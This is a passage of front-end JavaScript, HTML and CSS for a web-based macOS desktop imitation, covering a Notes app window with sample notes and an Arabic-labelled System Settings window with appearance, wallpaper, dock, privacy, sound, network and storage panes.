                    const terminalContent = windowEl.querySelector('.terminal-content');
                    terminalContent.scrollTop = terminalContent.scrollHeight;
                    input.value = '';
                }
            });
        }
        
        function openNotesApp() {
            const id = 'notes';
            if (openWindows.has(id)) {
                bringToFront(openWindows.get(id));
                return;
            }
            const content = `
                <div class="notes-app">
                    <div class="notes-sidebar">
                        <div class="notes-header">
                            <h3>Notes</h3>
                            <button class="new-note-btn">+</button>
                        </div>
                        <div class="notes-list">
                            <div class="note-item active">
                                <div class="note-title">Welcome Note</div>
                                <div class="note-preview">Welcome to Notes app...</div>
                            </div>
                            <div class="note-item">
                                <div class="note-title">Shopping List</div>
                                <div class="note-preview">Milk, Bread, Eggs...</div>
                            </div>
                            <div class="note-item">
                                <div class="note-title">Meeting Notes</div>
                                <div class="note-preview">Project discussion...</div>
                            </div>
                        </div>
                    </div>
                    <div class="notes-editor">
                        <div class="editor-toolbar">
                            <button class="toolbar-btn" title="Bold">B</button>
                            <button class="toolbar-btn" title="Italic">I</button>
                            <button class="toolbar-btn" title="Underline">U</button>
                            <div class="toolbar-separator"></div>
                            <button class="toolbar-btn" title="Bullet List">•</button>
                            <button class="toolbar-btn" title="Numbered List">1.</button>
                        </div>
                        <div class="editor-content" contenteditable="true" placeholder="Start writing your note...">
                            Welcome to Notes!
                            
                            This is a simple note-taking app that mimics the macOS Notes application.
                            
                            You can:
                            • Write and edit notes
                            • Use basic formatting
                            • Organize your thoughts
                            
                            Start typing to create your first note...
                        </div>
                    </div>
                </div>
            `;
            const windowEl = createWindow(id, 'Notes', content, {minWidth: '700px', minHeight: '500px'});
            
            const notesStyle = document.createElement('style');
            notesStyle.textContent = `
                .notes-app {
                    display: flex;
                    height: 100%;
                    background: #f5f5f7;
                    font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', sans-serif;
                }
                
                .notes-sidebar {
                    width: 280px;
                    background: #ffffff;
                    border-right: 1px solid #d1d1d6;
                    display: flex;
                    flex-direction: column;
                }
                
                .notes-header {
                    padding: 20px;
                    border-bottom: 1px solid #d1d1d6;
                    display: flex;
                    justify-content: space-between;
                    align-items: center;
                    height: 72px;
                    box-sizing: border-box;
                }
                
                .notes-header h3 {
                    margin: 0;
                    font-size: 18px;
                    font-weight: 600;
                    color: #1d1d1f;
                    font-family: 'SF Pro Display', -apple-system, BlinkMacSystemFont, sans-serif;
                }
                
                .new-note-btn {
                    width: 32px;
                    height: 32px;
                    border-radius: 50%;
                    border: none;
                    background: #007AFF;
                    color: white;
                    font-size: 20px;
                    cursor: pointer;
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    transition: all 0.15s ease;
                    font-weight: 500;
                }
                
                .new-note-btn:hover {
                    background: #0056CC;
                    transform: scale(1.1);
                }
                
                .notes-list {
                    flex: 1;
                    overflow-y: auto;
                    padding: 8px 0;
                }
                
                .note-item {
                    padding: 12px 16px;
                    cursor: pointer;
                    transition: background-color 0.2s ease;
                    border-bottom: 1px solid #f0f0f0;
                }
                
                .note-item:hover {
                    background-color: #f8f8f8;
                }
                
                .note-item.active {
                    background-color: #007AFF;
                    color: white;
                }
                
                .note-title {
                    font-weight: 500;
                    font-size: 14px;
                    margin-bottom: 4px;
                }
                
                .note-preview {
                    font-size: 12px;
                    color: #86868b;
                    line-height: 1.3;
                }
                
                .note-item.active .note-preview {
                    color: rgba(255, 255, 255, 0.8);
                }
                
                .notes-editor {
                    flex: 1;
                    display: flex;
                    flex-direction: column;
                    background: #ffffff;
                }
                
                .editor-toolbar {
                    padding: 8px 16px;
                    border-bottom: 1px solid #e5e5e7;
                    display: flex;
                    gap: 8px;
                    align-items: center;
                }
                
                .toolbar-btn {
                    width: 28px;
                    height: 28px;
                    border: 1px solid #d1d1d6;
                    background: #ffffff;
                    border-radius: 4px;
                    cursor: pointer;
                    font-size: 12px;
                    font-weight: 600;
                    transition: all 0.2s ease;
                }
                
                .toolbar-btn:hover {
                    background: #f5f5f7;
                    border-color: #007AFF;
                }
                
                .toolbar-separator {
                    width: 1px;
                    height: 20px;
                    background: #d1d1d6;
                    margin: 0 4px;
                }
                
                .editor-content {
                    flex: 1;
                    padding: 20px;
                    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
                    font-size: 14px;
                    line-height: 1.6;
                    color: #1d1d1f;
                    outline: none;
                    overflow-y: auto;
                    background: #ffffff;
                }
                
                .editor-content:empty:before {
                    content: attr(placeholder);
                    color: #86868b;
                    pointer-events: none;
                }
                
                .editor-content:focus {
                    background: #ffffff;
                }
            `;
            document.head.appendChild(notesStyle);
            
            const noteItems = windowEl.querySelectorAll('.note-item');
            const editorContent = windowEl.querySelector('.editor-content');
            
            noteItems.forEach(item => {
                item.addEventListener('click', () => {
                    noteItems.forEach(note => note.classList.remove('active'));
                    item.classList.add('active');
                    
                    const noteTitle = item.querySelector('.note-title').textContent;
                    if (noteTitle === 'Welcome Note') {
                        editorContent.innerHTML = `Welcome to Notes!

This is a simple note-taking app that mimics the macOS Notes application.

You can:
• Write and edit notes
• Use basic formatting
• Organize your thoughts

Start typing to create your first note...`;
                    } else if (noteTitle === 'Shopping List') {
                        editorContent.innerHTML = `Shopping List:

• Milk
• Bread
• Eggs
• Butter
• Cheese
• Vegetables
• Fruits`;
                    } else if (noteTitle === 'Meeting Notes') {
                        editorContent.innerHTML = `Meeting Notes - Project Discussion

Date: ${new Date().toLocaleDateString()}

Agenda:
1. Project timeline review
2. Resource allocation
3. Next steps

Action Items:
- Schedule follow-up meeting
- Prepare presentation slides
- Update project documentation`;
                    }
                });
            });
            
            const newNoteBtn = windowEl.querySelector('.new-note-btn');
            newNoteBtn.addEventListener('click', () => {
                const newNote = document.createElement('div');
                newNote.className = 'note-item active';
                newNote.innerHTML = `
                    <div class="note-title">New Note</div>
                    <div class="note-preview">Empty note...</div>
                `;
                
                noteItems.forEach(note => note.classList.remove('active'));
                windowEl.querySelector('.notes-list').insertBefore(newNote, windowEl.querySelector('.notes-list').firstChild);
                editorContent.innerHTML = '';
                editorContent.focus();
            });
        }

        function openSettings() {
            const id = 'settings';
            if (openWindows.has(id)) { bringToFront(openWindows.get(id)); return; }
            const content = `
                <div class="settings-sidebar">
                    <div class="space-y-1">
                        <div class="settings-item active" data-pane="appearance-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 21.623a9.623 9.623 0 0 1 0-19.246 9.623 9.623 0 0 1 0 19.246Zm0-1.282a8.341 8.341 0 0 0 0-16.682v16.682Z" fill="currentColor"></path></svg>
                            <span>المظهر</span>
                        </div>
                        <div class="settings-item" data-pane="wallpaper-pane">
                             <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path fill-rule="evenodd" clip-rule="evenodd" d="M1.5 4.5A3 3 0 0 1 4.5 1.5h15a3 3 0 0 1 3 3v15a3 3 0 0 1-3 3h-15a3 3 0 0 1-3-3v-15ZM4.5 3a1.5 1.5 0 0 0-1.5 1.5v15a1.5 1.5 0 0 0 1.5 1.5h15a1.5 1.5 0 0 0 1.5-1.5v-15a1.5 1.5 0 0 0-1.5-1.5h-15Z" fill="currentColor"></path><path d="M6.5 14.5a1 1 0 1 0 0-2 1 1 0 0 0 0 2Z" fill="currentColor"></path><path d="m10.152 9.21-4.25 5.667a.75.75 0 0 0 .996 1.123l4.25-5.667a.75.75 0 0 0-.996-1.123Z" fill="currentColor"></path><path d="m19.25 14.25-6-8.5a.75.75 0 0 0-1.24.883l6 8.5a.75.75 0 1 0 1.24-.883Z" fill="currentColor"></path></svg>
                            <span>الخلفية</span>
                        </div>
                         <div class="settings-item" data-pane="dock-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M2 19.5a2 2 0 0 0 2 2h16a2 2 0 0 0 2-2v-1.25a.75.75 0 0 0-.75-.75H2.75a.75.75 0 0 0-.75.75V19.5Z" fill="currentColor"></path></svg>
                            <span>الشريط السفلي</span>
                        </div>
                        <div class="settings-item" data-pane="notifications-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2zm6-6v-5c0-3.07-1.63-5.64-4.5-6.32V4c0-.83-.67-1.5-1.5-1.5s-1.5.67-1.5 1.5v.68C7.64 5.36 6 7.92 6 11v5l-2 2v1h16v-1l-2-2zm-2 1H8v-6c0-2.48 1.51-4.5 4-4.5s4 2.02 4 4.5v6z" fill="currentColor"></path></svg>
                            <span>الإشعارات</span>
                        </div>
                        <div class="settings-item" data-pane="privacy-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z" fill="currentColor"></path></svg>
                            <span>الخصوصية والأمان</span>
                        </div>
                        <div class="settings-item" data-pane="accessibility-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2c1.1 0 2 .9 2 2s-.9 2-2 2-2-.9-2-2 .9-2 2-2zm9 7h-6v13h-2v-6h-2v6H9V9H3V7h18v2z" fill="currentColor"></path></svg>
                            <span>إمكانية الوصول</span>
                        </div>
                        <div class="settings-item" data-pane="sound-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M3 9v6h4l5 5V4L7 9H3zm13.5 3c0-1.77-1.02-3.29-2.5-4.03v8.05c1.48-.73 2.5-2.25 2.5-4.02zM14 3.23v2.06c2.89.86 5 3.54 5 6.71s-2.11 5.85-5 6.71v2.06c4.01-.91 7-4.49 7-8.77s-2.99-7.86-7-8.77z" fill="currentColor"></path></svg>
                            <span>الصوت</span>
                        </div>
                        <div class="settings-item" data-pane="network-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="currentColor"></path></svg>
                            <span>الشبكة</span>
                        </div>
                        <div class="settings-item" data-pane="storage-pane">
                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M20 6h-8l-2-2H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm0 12H4V8h16v10z" fill="currentColor"></path></svg>
                            <span>التخزين</span>
                        </div>
                    </div>
                </div>
                <div class="settings-content">
                    <div id="appearance-pane" class="settings-pane">
                        <div class="appearance-content">
                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">المظهر</h3>
                                </div>
                                <div class="section-content">
                                    <div class="appearance-options">
                                        <div class="appearance-option selected" data-theme="light">
                                            <div class="appearance-preview light-preview">
                                                <div class="preview-window">
                                                    <div class="preview-titlebar"></div>
                                                    <div class="preview-content"></div>
                                                </div>
                                            </div>
                                            <div class="appearance-label">
                                                <div class="radio-button selected"></div>
                                                <span>فاتح</span>
                                            </div>
                                        </div>
                                        <div class="appearance-option" data-theme="dark">
                                            <div class="appearance-preview dark-preview">
                                                <div class="preview-window dark">
                                                    <div class="preview-titlebar dark"></div>
                                                    <div class="preview-content dark"></div>
                                                </div>
                                            </div>
                                            <div class="appearance-label">
                                                <div class="radio-button"></div>
                                                <span>داكن</span>
                                            </div>
                                        </div>
                                        <div class="appearance-option" data-theme="auto">
                                            <div class="appearance-preview auto-preview">
                                                <div class="preview-window auto">
                                                    <div class="preview-titlebar auto"></div>
                                                    <div class="preview-content auto"></div>
                                                </div>
                                            </div>
                                            <div class="appearance-label">
                                                <div class="radio-button"></div>
                                                <span>تلقائي</span>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>

                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">لون التمييز</h3>
                                </div>
                                <div class="section-content">
                                    <div class="accent-colors">
                                        <div class="accent-color selected" data-color="blue" style="background-color: #007AFF;"></div>
                                        <div class="accent-color" data-color="purple" style="background-color: #AF52DE;"></div>
                                        <div class="accent-color" data-color="pink" style="background-color: #FF2D92;"></div>
                                        <div class="accent-color" data-color="red" style="background-color: #FF3B30;"></div>
                                        <div class="accent-color" data-color="orange" style="background-color: #FF9500;"></div>
                                        <div class="accent-color" data-color="yellow" style="background-color: #FFCC02;"></div>
                                        <div class="accent-color" data-color="green" style="background-color: #34C759;"></div>
                                        <div class="accent-color" data-color="teal" style="background-color: #5AC8FA;"></div>
                                        <div class="accent-color" data-color="cyan" style="background-color: #32ADE6;"></div>
                                        <div class="accent-color" data-color="indigo" style="background-color: #5856D6;"></div>
                                        <div class="accent-color" data-color="gray" style="background-color: #8E8E93;"></div>
                                        <div class="accent-color" data-color="dark-gray" style="background-color: #636366;"></div>
                                    </div>
                                </div>
                            </div>

                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">حجم أيقونات الشريط الجانبي</h3>
                                </div>
                                <div class="section-content">
                                    <div class="slider-container">
                                        <div class="slider-labels">
                                            <span class="slider-label">صغير</span>
                                            <span class="slider-value" id="sidebar-size-display">16</span>
                                            <span class="slider-label">كبير</span>
                                        </div>
                                                                                 <div class="slider-track">
                                             <input type="range" id="sidebar-icon-size" min="12" max="20" value="16" class="mac-slider ios-style">
                                         </div>
                                    </div>
                                </div>
                            </div>

                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">شريط التمرير</h3>
                                </div>
                                <div class="section-content">
                                    <div class="radio-group">
                                        <label class="radio-option">
                                            <input type="radio" name="scrollbar" value="always" class="mac-radio">
                                            <span class="radio-custom"></span>
                                            <span class="radio-label">دائماً</span>
                                        </label>
                                        <label class="radio-option">
                                            <input type="radio" name="scrollbar" value="automatic" checked class="mac-radio">
                                            <span class="radio-custom"></span>
                                            <span class="radio-label">تلقائي</span>
                                        </label>
                                        <label class="radio-option">
                                            <input type="radio" name="scrollbar" value="never" class="mac-radio">
                                            <span class="radio-custom"></span>
                                            <span class="radio-label">أبداً</span>
                                        </label>
                                    </div>
                                </div>
                            </div>

                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">متصفح الويب الافتراضي</h3>
                                </div>
                                <div class="section-content">
                                    <div class="select-container">
                                        <select id="default-browser" class="mac-select">
                                            <option value="safari">Safari</option>
                                            <option value="chrome">Google Chrome</option>
                                            <option value="firefox">Firefox</option>
                                            <option value="edge">Microsoft Edge</option>
                                        </select>
                                    </div>
                                </div>
                            </div>

                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">العناصر الحديثة</h3>
                                </div>
                                <div class="section-content">
                                    <div class="checkbox-group">
                                        <label class="checkbox-option">
                                            <input type="checkbox" id="recent-apps" checked class="mac-checkbox">
                                            <span class="checkbox-custom"></span>
                                            <span class="checkbox-label">التطبيقات</span>
                                        </label>
                                        <label class="checkbox-option">
                                            <input type="checkbox" id="recent-documents" checked class="mac-checkbox">
                                            <span class="checkbox-custom"></span>
                                            <span class="checkbox-label">المستندات</span>
                                        </label>
                                        <label class="checkbox-option">
                                            <input type="checkbox" id="recent-servers" class="mac-checkbox">
                                            <span class="checkbox-custom"></span>
                                            <span class="checkbox-label">الخوادم</span>
                                        </label>
                                    </div>
                                </div>
                            </div>

                            <div class="settings-section">
                                <div class="section-header">
                                    <h3 class="section-title">عدد العناصر الحديثة</h3>
                                </div>
                                <div class="section-content">
                                    <div class="slider-container">
                                        <div class="slider-labels">
                                            <span class="slider-label">5</span>
                                            <span class="slider-value" id="recent-count-display">10</span>
                                            <span class="slider-label">50</span>
                                        </div>
                                                                                 <div class="slider-track">
                                             <input type="range" id="recent-items-count" min="5" max="50" value="10" class="mac-slider ios-style">
                                         </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <div id="wallpaper-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">الخلفية</h2>
                        <div class="wallpaper-grid">
                            <img src="https://images-wixmp-ed30a86b8c4ca887773594c2.wixmp.com/f/1a42e634-f588-40e9-941b-60cf3f20aa39/dflzkpn-5cf9b61b-0e85-4dfb-868e-0e8bca0ec3f8.jpg/v1/fill/w_1280,h_720,q_75,strp/abstract_macbook_wallpaper_by_wallswiftnet_dflzkpn-fullview.jpg?token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJ1cm46YXBwOjdlMGQxODg5ODIyNjQzNzNhNWYwZDQxNWVhMGQyNmUwIiwiaXNzIjoidXJuOmFwcDo3ZTBkMTg4OTgyMjY0MzczYTVmMGQ0MTVlYTBkMjZlMCIsIm9iaiI6W1t7ImhlaWdodCI6Ijw9NzIwIiwicGF0aCI6IlwvZlwvMWE0MmU2MzQtZjU4OC00MGU5LTk0MWItNjBjZjNmMjBhYTM5XC9kZmx6a3BuLTVjZjliNjFiLTBlODUtNGRmYi04NjhlLTBlOGJjYTBlYzNmOC5qcGciLCJ3aWR0aCI6Ijw9MTI4MCJ9XV0sImF1ZCI6WyJ1cm46c2VydmljZTppbWFnZS5vcGVyYXRpb25zIl19.CkAtwyLDj08LA-y1S6lqMVN_jyo1NgzEQFbaq2Dtslo" class="wallpaper-thumb active">
                            <img src="https://source.unsplash.com/random/800x600?macos,sonoma" class="wallpaper-thumb">
                            <img src="https://source.unsplash.com/random/800x600?macos,ventura" class="wallpaper-thumb">
                            <img src="https://source.unsplash.com/random/800x600?abstract" class="wallpaper-thumb">
                        </div>
                        <div class="mt-6">
                            <label for="wallpaper-upload" class="upload-btn">رفع صورة...</label>
                            <input type="file" id="wallpaper-upload" class="hidden" accept="image/*">
                        </div>
                    </div>
                     <div id="dock-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">الشريط السفلي والقائمة</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <label for="dock-size">حجم الأيقونات</label>
                                <input type="range" id="dock-size" min="40" max="80" value="52">
                            </div>
                             <div class="settings-list-item">
                                <label for="dock-magnification">التكبير</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="dock-magnification" class="sr-only peer" checked>
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                        </div>
                    </div>
                    <div id="notifications-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">الإشعارات</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <label for="notifications-enabled">تفعيل الإشعارات</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="notifications-enabled" class="sr-only peer" checked>
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                            <div class="settings-list-item">
                                <label for="notification-sound">صوت الإشعارات</label>
                                <select id="notification-sound" class="border rounded px-2 py-1">
                                    <option value="default">افتراضي</option>
                                    <option value="glass">زجاج</option>
                                    <option value="chime">نغمة</option>
                                </select>
                            </div>
                            <div class="settings-list-item">
                                <label for="notification-duration">مدة عرض الإشعار</label>
                                <select id="notification-duration" class="border rounded px-2 py-1">
                                    <option value="3">3 ثواني</option>
                                    <option value="5" selected>5 ثواني</option>
                                    <option value="10">10 ثواني</option>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div id="privacy-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">الخصوصية والأمان</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <label for="location-services">خدمات الموقع</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="location-services" class="sr-only peer">
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                            <div class="settings-list-item">
                                <label for="camera-access">الوصول للكاميرا</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="camera-access" class="sr-only peer" checked>
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                            <div class="settings-list-item">
                                <label for="microphone-access">الوصول للميكروفون</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="microphone-access" class="sr-only peer" checked>
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                        </div>
                    </div>
                    <div id="accessibility-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">إمكانية الوصول</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <label for="zoom-enabled">تكبير الشاشة</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="zoom-enabled" class="sr-only peer">
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                            <div class="settings-list-item">
                                <label for="high-contrast">تباين عالي</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="high-contrast" class="sr-only peer">
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                            <div class="settings-list-item">
                                <label for="text-size">حجم النص</label>
                                <select id="text-size" class="border rounded px-2 py-1">
                                    <option value="small">صغير</option>
                                    <option value="medium" selected>متوسط</option>
                                    <option value="large">كبير</option>
                                    <option value="extra-large">كبير جداً</option>
                                </select>
                            </div>
                        </div>
                    </div>
                    <div id="sound-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">الصوت</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <label for="system-volume">مستوى الصوت</label>
                                <div class="flex items-center gap-4">
                                    <input type="range" id="system-volume" min="0" max="100" value="50" class="mac-slider ios-style flex-1">
                                    <span id="volume-display" class="slider-value">50%</span>
                                </div>
                            </div>
                            <div class="settings-list-item">
                                <label for="alert-volume">صوت التنبيهات</label>
                                <div class="flex items-center gap-4">
                                    <input type="range" id="alert-volume" min="0" max="100" value="30" class="mac-slider ios-style flex-1">
                                    <span id="alert-display" class="slider-value">30%</span>
                                </div>
                            </div>
                            <div class="settings-list-item">
                                <label for="sound-effects">أصوات النظام</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="sound-effects" class="sr-only peer" checked>
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                        </div>
                    </div>
                    <div id="network-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">الشبكة</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <span>Wi-Fi</span>
                                <div class="flex items-center gap-2">
                                    <span class="text-green-500">متصل</span>
                                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" class="text-green-500">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z" fill="currentColor"></path></svg>
                                </div>
                            </div>
                            <div class="settings-list-item">
                                <span>اسم الشبكة</span>
                                <span class="text-gray-600">MyWiFi_Network</span>
                            </div>
                            <div class="settings-list-item">
                                <label for="auto-join-wifi">الانضمام التلقائي</label>
                                <label class="relative inline-flex items-center cursor-pointer">
                                  <input type="checkbox" id="auto-join-wifi" class="sr-only peer" checked>
                                  <div class="w-11 h-6 bg-gray-200 rounded-full peer peer-checked:after:translate-x-full peer-checked:after:border-white after:content-[''] after:absolute after:top-0.5 after:left-[2px] after:bg-white after:border-gray-300 after:border after:rounded-full after:h-5 after:w-5 after:transition-all peer-checked:bg-blue-600"></div>
                                </label>
                            </div>
                        </div>
                    </div>
                    <div id="storage-pane" class="settings-pane hidden">
                        <h2 class="text-xl font-semibold mb-6">التخزين</h2>
                        <div class="settings-pane-list">
                            <div class="settings-list-item">
                                <span>المساحة المستخدمة</span>
                                <span class="text-gray-600">127.5 GB من 512 GB</span>
                            </div>
                            <div class="settings-list-item">
                                <div class="w-full">
                                    <div class="w-full bg-gray-200 rounded-full h-2">
                                        <div class="bg-blue-600 h-2 rounded-full" style="width: 25%"></div>
                                    </div>
                                </div>
                            </div>
                            <div class="settings-list-item">
                                <span>التطبيقات</span>
                                <span class="text-gray-600">45.2 GB</span>
                            </div>
                            <div class="settings-list-item">
                                <span>الملفات</span>
                                <span class="text-gray-600">32.1 GB</span>
                            </div>
                            <div class="settings-list-item">
                                <span>النظام</span>
                                <span class="text-gray-600">15.8 GB</span>
                            </div>
                        </div>
                    </div>
                </div>
            `;
            const windowEl = createWindow(id, 'System Settings', content, {minWidth: '100vh', minHeight: '450px'});
            
            const settingsItems = windowEl.querySelectorAll('.settings-item');
            const settingsPanes = windowEl.querySelectorAll('.settings-pane');
            settingsItems.forEach(item => {
                item.addEventListener('click', () => {
                    settingsItems.forEach(i => i.classList.remove('active'));
                    item.classList.add('active');
                    const paneId = item.dataset.pane;
                    settingsPanes.forEach(pane => pane.classList.toggle('hidden', pane.id !== paneId));
                });
            });

            const appearanceOptions = windowEl.querySelectorAll('.appearance-option');
            appearanceOptions.forEach(option => {
                option.addEventListener('click', () => {
                    appearanceOptions.forEach(opt => opt.classList.remove('selected'));
                    option.classList.add('selected');
                    
                    const radioButton = option.querySelector('.radio-button');
                    windowEl.querySelectorAll('.radio-button').forEach(btn => btn.classList.remove('selected'));
                    radioButton.classList.add('selected');
                    
                    const theme = option.dataset.theme;
                    if (theme === 'dark') {
                        document.body.classList.add('dark-mode');
                        updateSlidersForDarkMode();
                    } else if (theme === 'light') {
                        document.body.classList.remove('dark-mode');
                        updateSlidersForLightMode();
                    } else if (theme === 'auto') {
                        const prefersDark = window.matchMedia('(prefers-color-scheme: dark)').matches;
                        document.body.classList.toggle('dark-mode', prefersDark);
                        if (prefersDark) {
                            updateSlidersForDarkMode();
                        } else {
                            updateSlidersForLightMode();
                        }
                    }
                });
            });

            const accentColors = windowEl.querySelectorAll('.accent-color');
            accentColors.forEach(color => {
                color.addEventListener('click', () => {
                    accentColors.forEach(c => c.classList.remove('selected'));
                    color.classList.add('selected');
                    
                    const colorName = color.dataset.color;
                    const colorMap = {
                        'blue': '#007AFF',
                        'purple': '#AF52DE',
                        'pink': '#FF2D92',
                        'red': '#FF3B30',
                        'orange': '#FF9500',
                        'yellow': '#FFCC02',
                        'green': '#34C759',
                        'teal': '#5AC8FA',
                        'cyan': '#32ADE6',
                        'indigo': '#5856D6',
                        'gray': '#8E8E93',
                        'dark-gray': '#636366'
                    };
                    
                    const selectedColor = colorMap[colorName];
                    document.documentElement.style.setProperty('--accent-color', selectedColor);
                    
                    const accentElements = document.querySelectorAll('.settings-item.active');
                    accentElements.forEach(el => {
                        el.style.backgroundColor = selectedColor;
                    });
                });
            });

            const sidebarIconSize = windowEl.querySelector('#sidebar-icon-size');
            const sidebarSizeDisplay = windowEl.querySelector('#sidebar-size-display');
            sidebarIconSize.addEventListener('input', (e) => {
                const size = e.target.value;
                sidebarSizeDisplay.textContent = size;
                document.documentElement.style.setProperty('--sidebar-icon-size', `${size}px`);
                
                const percentage = ((size - 12) / (20 - 12)) * 100;
                e.target.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${percentage}%, #e5e5e7 ${percentage}%, #e5e5e7 100%)`;
            });
            
            const sidebarPercentage = ((16 - 12) / (20 - 12)) * 100;
            sidebarIconSize.style.background = `linear-gradient(to right, #007AFF 0%, #007AFF ${sidebarPercentage}%, #e5e5e7 ${sidebarPercentage}%, #e5e5e7 100%)`;

            const recentItemsCount = windowEl.querySelector('#recent-items-count');
            const recentCountDisplay = windowEl.querySelector('#recent-count-display');
            recentItemsCount.addEventListener('input', (e) => {
                const count = e.target.value;
                recentCountDisplay.textContent = count;
                
